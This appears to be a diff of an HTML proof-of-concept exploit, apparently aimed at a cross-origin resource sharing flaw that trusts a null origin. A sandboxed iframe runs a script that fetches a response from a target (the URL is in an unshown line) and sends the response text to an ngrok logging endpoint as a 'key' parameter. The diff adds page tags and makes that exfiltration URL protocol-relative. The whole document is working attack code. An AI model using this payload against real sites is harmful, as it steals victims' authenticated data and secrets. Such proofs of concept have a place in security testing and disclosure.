@@ -1,3 +1,6 @@
+<!DOCTYPE html>
+<html>
+<body>
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
@@ -6,6 +9,7 @@
   req.send();
 
   function reqListener() {
-    location='https://2d7a-140-213-103-229.ngrok-free.app/log?key='+encodeURIComponent(this.responseText);
+    location='//2d7a-140-213-103-229.ngrok-free.app/log?key='+encodeURIComponent(this.responseText);
    };
-</script>"></iframe> 
+</script>"></iframe> </body>
+</html>
